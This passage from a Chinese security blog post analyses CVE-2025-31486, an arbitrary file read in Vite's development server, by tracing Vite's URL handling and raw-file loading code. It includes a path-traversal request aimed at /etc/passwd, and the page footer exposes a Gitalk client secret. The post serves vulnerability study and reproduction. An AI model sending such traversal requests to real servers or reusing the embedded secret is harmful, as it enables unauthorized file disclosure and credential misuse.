<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="title function_">removeImportQuery</span>(url)</span><br></pre></td></tr></table></figure>

<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> importQueryRE = <span class="regexp">/(\?|&amp;)import=?(?:&amp;|$)/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">removeImportQuery</span>(<span class="params"><span class="attr">url</span>: <span class="built_in">string</span></span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> url.<span class="title function_">replace</span>(importQueryRE, <span class="string">&#x27;$1&#x27;</span>).<span class="title function_">replace</span>(trailingSeparatorRE, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>去除掉了<code>import</code></p>
<p>变成了<code>/@fs/usr/src/node_modules/vite/?/../../../../../etc/passwd??raw</code></p>
<p>然后进入了</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="title function_">unwrapId</span>(url)</span><br></pre></td></tr></table></figure>

<p>这里没有变化，继续往下看。接着进入了<code>transformRequest</code>，再进入<code>doTransform</code>，然后又进行了一次<code>removeTimestampQuery</code>，没有变化。</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable language_">module</span> = <span class="keyword">await</span> environment.<span class="property">moduleGraph</span>.<span class="title function_">getModuleByUrl</span>(url)</span><br></pre></td></tr></table></figure>

<p>获得了id</p>
<p>接着进入<code>loadAndTransform</code></p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> result = <span class="title function_">loadAndTransform</span>(</span><br><span class="line">  environment,</span><br><span class="line">  id,</span><br><span class="line">  url,</span><br><span class="line">  options,</span><br><span class="line">  timestamp,</span><br><span class="line">  <span class="variable language_">module</span>,</span><br><span class="line">  resolved,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const loadResult = await pluginContainer.load(id)</span><br></pre></td></tr></table></figure>

<p>然后我们进入<code>load()</code></p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="title function_">load</span>(<span class="params">id</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (id[<span class="number">0</span>] === <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// Rollup convention, this id should be handled by the</span></span><br><span class="line">    <span class="comment">// plugin that marked it with \0</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// raw requests, read from disk</span></span><br><span class="line">  <span class="keyword">if</span> (rawRE.<span class="title function_">test</span>(id)) &#123;</span><br><span class="line">    <span class="keyword">const</span> file = <span class="title function_">checkPublicFile</span>(id, config) || <span class="title function_">cleanUrl</span>(id)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">addWatchFile</span>(file)</span><br><span class="line">    <span class="comment">// raw query, read file and return as string</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">`export default <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(</span></span></span><br><span class="line"><span class="subst"><span class="string">      <span class="keyword">await</span> fsp.readFile(file, <span class="string">&#x27;utf-8&#x27;</span>),</span></span></span><br><span class="line"><span class="subst"><span class="string">    )&#125;</span>`</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!urlRE.<span class="title function_">test</span>(id) &amp;&amp; !config.<span class="title function_">assetsInclude</span>(<span class="title function_">cleanUrl</span>(id))) &#123;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  id = <span class="title function_">removeUrlQuery</span>(id)</span><br><span class="line">  <span class="keyword">let</span> url = <span class="keyword">await</span> <span class="title function_">fileToUrl</span>(<span class="variable language_">this</span>, id)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Inherit HMR timestamp if this asset was invalidated</span></span><br><span class="line">  <span class="keyword">if</span> (!url.<span class="title function_">startsWith</span>(<span class="string">&#x27;data:&#x27;</span>) &amp;&amp; <span class="variable language_">this</span>.<span class="property">environment</span>.<span class="property">mode</span> === <span class="string">&#x27;dev&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> mod = <span class="variable language_">this</span>.<span class="property">environment</span>.<span class="property">moduleGraph</span>.<span class="title function_">getModuleById</span>(id)</span><br><span class="line">    <span class="keyword">if</span> (mod &amp;&amp; mod.<span class="property">lastHMRTimestamp</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      url = <span class="title function_">injectQuery</span>(url, <span class="string">`t=<span class="subst">$&#123;mod.lastHMRTimestamp&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">code</span>: <span class="string">`export default <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(encodeURIPath(url))&#125;</span>`</span>,</span><br><span class="line">    <span class="comment">// Force rollup to keep this module from being shared between other entry points if it&#x27;s an entrypoint.</span></span><br><span class="line">    <span class="comment">// If the resulting chunk is empty, it will be removed in generateBundle.</span></span><br><span class="line">    <span class="attr">moduleSideEffects</span>:</span><br><span class="line">      config.<span class="property">command</span> === <span class="string">&#x27;build&#x27;</span> &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">getModuleInfo</span>(id)?.<span class="property">isEntry</span></span><br><span class="line">        ? <span class="string">&#x27;no-treeshake&#x27;</span></span><br><span class="line">        : <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">meta</span>: config.<span class="property">command</span> === <span class="string">&#x27;build&#x27;</span> ? &#123; <span class="string">&#x27;vite:asset&#x27;</span>: <span class="literal">true</span> &#125; : <span class="literal">undefined</span>,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>通过了<code>rawRE.test</code>，没有防御目录穿越，导致了任意文件读取！</p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Meteor_Kai</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://meteorkai.github.io/2025/04/10/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31486/">http://meteorkai.github.io/2025/04/10/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-31486/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>CyberSecurity brings me great joy!</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/CVE%E5%A4%8D%E7%8E%B0/"># CVE复现</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2025/04/17/Vite%E5%BC%80%E5%8F%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0-CVE-2025-32395/">Vite开发服务器任意文件读取漏洞分析复现(CVE-2025-32395)</a>
            
            
            <a class="next" rel="next" href="/2025/04/09/XYCTF2025-Web-wp/">XYCTF2025 Web wp</a>
            
        </section>

        
        <section class="post-comment">
            <div id="gitalk-container"></div>
            <!-- Gitalk 评论系统 -->
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
            <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
            <script>
                const gitalk = new Gitalk({
                    clientID: 'Ov23lic9P3cvx2KaU1EY',
                    clientSecret: '3e23d762ed77df57e97bf8d60831a44aae20d801',
                    repo: 'blog-comments',
                    owner: 'MeteorKai',
                    admin: [&#34;MeteorKai&#34;],
                    distractionFreeMode: false,
                    perPage: 10,
                    pagerDirection: 'last',
                    createIssueManually: false,
                    id: 'location.pathname',
                    title: 'location.pathname',
                    labels: [&#34;Gitalk&#34;],
                    body: '',
                    language: 'zh-CN',
                    proxy: '',
                    flipMoveOptions: null,
                    enableHotKey: true
                })
                gitalk.render('gitalk-container')
            </script>
        </section>
        

    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Meteor_Kai | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
        <span class="post-meta-divider">|</span>
        <span id="busuanzi_container_site_uv">
            访客数：<span id="busuanzi_value_site_uv"></span>
        </span>
        <span class="post-meta-divider">|</span>
        <span id="busuanzi_container_site_pv">
            总访问量：<span id="busuanzi_value_site_pv"></span>
        </span>
    </div>
    <!-- 不蒜子计数器 -->
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
</footer>

    </div>
</body>

</html>